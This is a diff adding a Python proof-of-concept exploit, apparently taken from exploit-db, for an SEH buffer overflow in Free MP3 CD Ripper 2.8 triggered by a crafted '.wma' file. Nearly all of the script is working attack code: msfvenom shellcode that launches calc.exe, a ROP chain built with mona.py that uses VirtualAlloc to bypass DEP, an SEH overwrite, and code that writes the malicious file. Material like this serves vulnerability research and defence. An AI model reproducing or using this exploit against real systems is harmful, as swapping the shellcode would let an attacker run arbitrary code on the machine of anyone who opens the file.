@@ -1,0 +1,80 @@
+# Exploit Title: Free MP3 CD Ripper 2.8 - '.wma' Buffer Overflow (SEH) (DEP Bypass)
+# Date: 2018-10-08
+# Exploit Author: Matteo Malvica
+# Vendor: Cleanersoft Software
+# Software Link: http://www.commentcamarche.net/download/telecharger-34082200-free-mp3-cd-ripper
+# Tested Version: 2.8
+# Tested on OS: Windows 7 - 64bit
+# Modified SEH Exploit https://www.exploit-db.com/exploits/45412/
+# CVE : N/A
+#
+# Steps:
+# 0.  Turn DEP on and reboot 
+# I   Run the python script, it will create a new file with the name "exploit.wma". 
+# II  Start the program and click on "Convert". 
+# III Load the file "exploit.wma"
+# IV  A shiny calculator will pop-up on your desktop
+    
+#!/usr/bin/python  
+import struct
+ 
+# msfvenom -p windows/exec  CMD=calc.exe -b '\x00\x0a\x0d\x2f' -f python
+shellcode = ""
+shellcode += "\xdb\xde\xd9\x74\x24\xf4\x58\x2b\xc9\xb1\x31\xba\xef"
+shellcode += "\xc3\xbd\x59\x83\xc0\x04\x31\x50\x14\x03\x50\xfb\x21"
+shellcode += "\x48\xa5\xeb\x24\xb3\x56\xeb\x48\x3d\xb3\xda\x48\x59"
+shellcode += "\xb7\x4c\x79\x29\x95\x60\xf2\x7f\x0e\xf3\x76\xa8\x21"
+shellcode += "\xb4\x3d\x8e\x0c\x45\x6d\xf2\x0f\xc5\x6c\x27\xf0\xf4"
+shellcode += "\xbe\x3a\xf1\x31\xa2\xb7\xa3\xea\xa8\x6a\x54\x9f\xe5"
+shellcode += "\xb6\xdf\xd3\xe8\xbe\x3c\xa3\x0b\xee\x92\xb8\x55\x30"
+shellcode += "\x14\x6d\xee\x79\x0e\x72\xcb\x30\xa5\x40\xa7\xc2\x6f"
+shellcode += "\x99\x48\x68\x4e\x16\xbb\x70\x96\x90\x24\x07\xee\xe3"
+shellcode += "\xd9\x10\x35\x9e\x05\x94\xae\x38\xcd\x0e\x0b\xb9\x02"
+shellcode += "\xc8\xd8\xb5\xef\x9e\x87\xd9\xee\x73\xbc\xe5\x7b\x72"
+shellcode += "\x13\x6c\x3f\x51\xb7\x35\x9b\xf8\xee\x93\x4a\x04\xf0"
+shellcode += "\x7c\x32\xa0\x7a\x90\x27\xd9\x20\xfe\xb6\x6f\x5f\x4c"
+shellcode += "\xb8\x6f\x60\xe0\xd1\x5e\xeb\x6f\xa5\x5e\x3e\xd4\x59"
+shellcode += "\x15\x63\x7c\xf2\xf0\xf1\x3d\x9f\x02\x2c\x01\xa6\x80"
+shellcode += "\xc5\xf9\x5d\x98\xaf\xfc\x1a\x1e\x43\x8c\x33\xcb\x63"
+shellcode += "\x23\x33\xde\x07\xa2\xa7\x82\xe9\x41\x40\x20\xf6"
+
+def create_rop_chain():
+    # rop chain generated with mona.py - www.corelan.be
+    rop_gadgets = [
+      0x00487219,  # POP EDX # RETN [fcrip.exe] 
+      0x004e9208,  # ptr to &VirtualAlloc() [IAT fcrip.exe]
+      0x10007089,  # MOV EAX,DWORD PTR DS:[EDX] # RETN [libFLAC.dll] 
+      0x0040508e,  # XCHG EAX,ESI # RETN [fcrip.exe] 
+      0x004d9e5c,  # POP EBP # RETN [fcrip.exe] 
+      0x1000c5ce,  # & push esp # ret  [libFLAC.dll]
+      0x00445aff,  # POP EBX # RETN [fcrip.exe] 
+      0x00000001,  # 0x00000001-> ebx
+      0x00494012,  # POP EDX # RETN [fcrip.exe] 
+      0x00001000,  # 0x00001000-> edx
+      0x004c2d76,  # POP ECX # RETN [fcrip.exe] 
+      0x00000040,  # 0x00000040-> ecx
+      0x00409aa4,  # POP EDI # RETN [fcrip.exe] 
+      0x00412557,  # RETN (ROP NOP) [fcrip.exe]
+      0x639d1575,  # POP EAX # RETN [vorbis.dll] 
+      0x90909090,  # nop
+      0x00493619,  # PUSHAD # RETN [fcrip.exe] 
+    ]
+    return ''.join(struct.pack('<I', _) for _ in rop_gadgets)
+
+rop_chain = create_rop_chain()
+nop_block = '\x90' * 8
+total_buffer = 4444
+offset = "A" * 3804 
+SEH = struct.pack('<L',0x639d2ad8) # 0x639d2ad8  # ADD ESP,45C # XOR EAX,EAX # POP EBX # POP ESI # POP EDI # POP EBP # RETN    ** [vorbis.dll] **
+padding = "B" * (total_buffer  - len(SEH) - len(offset))
+
+payload = offset + nop_block + rop_chain + nop_block * 2  + shellcode + "\xCC" * 4  + SEH + padding
+
+try:
+    f=open("exploit.wma","w")
+    print "[+] Creating %s bytes of tiramisù payload..." %len(payload)
+    f.write(payload)
+    f.close()
+    print "[+] High carb exploit created!"
+except:
+    print "Dessert cannot be created"
